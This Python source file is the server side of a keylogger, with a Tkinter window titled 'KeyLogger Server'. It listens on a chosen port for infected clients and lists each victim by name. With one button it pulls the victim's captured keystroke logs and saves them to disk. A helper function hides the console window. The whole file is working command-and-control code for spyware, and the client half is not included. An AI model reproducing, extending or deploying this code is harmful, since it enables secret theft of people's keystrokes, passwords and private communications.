import tkinter as tk
import socket
import random
import os
import time
from tkinter import filedialog
import threading
import base64

class options_gui:
    def __init__(self, master):
        # setting up the window
        self.master = master
        #self.master.resizable(width=False, height=False)
        self.master.title('options')

        # choose directory label and button
        self.labeldirectory = tk.Label(master=self.master,
                                       text='Choose a directory where you want to save your files:', font=1).pack()
        self.directory = tk.Button(master=self.master, text='Choose a directory for your logs',
                                   height=1, command=self.choose_directory, borderwidth=1).pack()

        # a label that shows the current directory
        self.filenamelabel = tk.StringVar()
        self.label = tk.Label(master=self.master, textvariable=self.filenamelabel).pack(anchor='center')
        self.dirname = os.path._getfullpathname(os.path.curdir)
        self.set_filename()

        # a label and entery to choose a port
        self.labelPort = tk.Label(self.master, text='Enter Port here:', font=1).pack()
        self.enteryPort = tk.Entry(self.master, width=38, font=1)
        self.enteryPort.pack()
        self.enteryPort.insert(0, '23')

        # Setting up the button to start the program
        self.button = tk.Button(master=self.master, text='START!', height=1, width=10, font=1,
                                command=self.continu).pack()

        # if the user presses the exit button the program wont continue
        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)

    def continu(self):
        self.Port = self.enteryPort.get()
        self.master.destroy()
        self.master.quit()

    @staticmethod
    def on_closing():
        quit()


    def set_filename(self):
        """
        This function updates the buttom label according to the current file chosen
        """
        self.filenamelabel.set('The current chosen directory is: '+self.dirname)


    def choose_directory(self):
        """
        This function is using a dialog box to ask for the directory
        """
        self.dirname = filedialog.askdirectory(initialdir="/", title="Select directory")
        self.set_filename()

class main_gui:
    def __init__(self, master, s):
        # setting up the main window
        self.s = s
        self.master = master
        self.master.resizable(width=False, height=False)
        self.master.title('KeyLogger Server')

        # list of random names
        names = open('names.txt', 'r').read().split('\n')

        #self.master.bind("<Button-2>", lambda event: self.create_client(names[random.randint(0, len(names))]))

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.server_socket.bind(('0.0.0.0', int(s.Port)))
        self.server_socket.listen(5)
        print('server started')
        threading.Thread(target=self.server).start()



    def create_client(self, my_socket):
        """
        this function create a frame for each socket with his own name and the buttons he need to operate it
        :param socket: the socket of the user you connected to
        :return:
        """
        time.sleep(0.4)
        name = self.recvall(my_socket)
        name = name.decode('utf-8')
        # the frame
        frame = tk.Frame(master=self.master, width=200, height=100, bg='Black', highlightthickness=1, highlightbackground='blue')
        frame.pack_propagate(False)
        frame.pack(side=tk.TOP)

        # showing the name of the user
        tk.Label(master=frame, text=name).pack(side=tk.TOP)

        # the Quit button to quit and close the connection
        tk.Button(master=frame, text='quit', command=lambda: self.destroy_frame(frame, my_socket), fg='red', bg='black').pack(side=tk.RIGHT, anchor=tk.S)

        # The logs button to get the logs from the user
        tk.Button(master=frame, text='Get logs', fg='cyan', bg='black', command=lambda: self.get_logs(my_socket, name)).pack(side=tk.LEFT, anchor=tk.S)

    @staticmethod
    def destroy_frame(frame, client_socket):
        client_socket.send('quit'.encode('utf-8'))
        frame.pack_forget()
        frame.destroy()

    def get_logs(self, client_socket, name):
        client_socket.send('logs'.encode('utf-8'))
        time.sleep(0.1)
        data = self.recvall(client_socket).decode('utf-8')
        open(self.s.dirname+'\\'+name+'.txt', 'w').write(data)
        os.startfile(self.s.dirname+'\\'+name+'.txt')


    @staticmethod
    def hide():
        """
        This function hides the console
        """
        import win32console, win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True

    @staticmethod
    def recvall(sock):
        BUFF_SIZE = 4096  # 4 KiB
        data = b''
        while True:
            part = sock.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                # either 0 or end of data
                break
        return data

    def server(self):
        while True:
            (client_socket, address) = self.server_socket.accept()
            self.create_client(client_socket)


if __name__ == '__main__':
    root = tk.Tk()
    s = options_gui(root)
    root.mainloop()

    master = tk.Tk()
    re = main_gui(master, s)
    master.mainloop()
